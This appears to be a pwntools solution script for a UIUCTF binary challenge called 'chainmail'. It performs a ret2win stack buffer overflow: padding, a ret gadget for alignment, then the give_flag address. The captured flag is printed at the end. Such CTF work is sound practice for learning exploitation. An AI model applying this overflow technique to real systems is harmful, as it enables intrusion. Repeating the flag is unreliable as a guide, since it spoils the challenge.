
# A custom template for binary exploitation that uses pwntools.
# Examples:
#   python exploit.py DEBUG NOASLR GDB
#   python exploit.py DEBUG REMOTE

from pwn import *

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
context.binary = elfexe = ELF('./chal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, disable ASLR and run through GDB
# for all created processes: 
# $ ./exploit.py DEBUG NOASLR GDB
# You can also run the remote or local target with the option REMOTE
# Feasibility of remote debugging is possible only via ssh (not netcat) and depends from the remote system
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

# Specify your gdb script here for debugging. gdb will be launched the GDB argument is given.
gdbscript = '''
# init-gef
# target record-full # Not supported with AVX instructions yet

# b *main
# command
#     printf "argv ptr: %p\\n",$rsi
# end

# continue
b *give_flag
'''.format(**locals())
if args.GDB:
    log.info('Using gdb script:\n'+gdbscript)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

arguments = []
if args['REMOTE']:
    remote_server = 'chainmail.chal.uiuc.tf'
    remote_port = 1337
    io = remote(remote_server, remote_port)
else:
    io = start(arguments)

give_flag__addr = 0x401216   # give_flag
nop_gadget__addr  = 0x401287 # ret - stack alignment
io.send(b'A'*64)
io.send(b'B'*8)
io.send(p64(nop_gadget__addr))
io.send(p64(give_flag__addr))
io.send(b'\n')

io.interactive()
io.close()

# uiuctf{y0ur3_4_B1g_5h0t_n0w!11!!1!!!11!!!!1}
